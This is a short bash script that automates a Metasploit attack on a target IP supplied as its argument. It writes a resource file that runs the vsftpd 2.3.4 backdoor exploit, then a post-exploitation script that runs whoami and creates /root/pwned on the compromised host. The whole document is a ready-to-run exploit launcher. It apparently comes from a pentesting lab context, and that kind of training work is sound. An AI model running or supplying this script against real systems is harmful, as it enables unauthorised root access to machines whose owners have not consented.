#!/bin/bash

targetIpAddress=$1
msfScriptPath=/tmp/insideMsf

mkdir -p $msfScriptPath

main() {
    echo "[PREPARING SCRIPTS...]"
    sleep 2

    generateMetasploitResource
    generatePostExploitationScript

    echo "[RUNNING METASPLOIT ON TARGET $targetIpAddress]"
    msfconsole -r $msfScriptPath/vsftpd.rc && echo "done"
}

generatePostExploitationScript() {
	cat <<EOF > $msfScriptPath/payload.rc
	whoami
	touch /root/pwned
	exit
EOF
}

generateMetasploitResource() {
	cat <<EOF > $msfScriptPath/vsftpd.rc
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOST $targetIpAddress
    set AutoRunScript $msfScriptPath/payload.rc
    run
    exit
EOF
}

main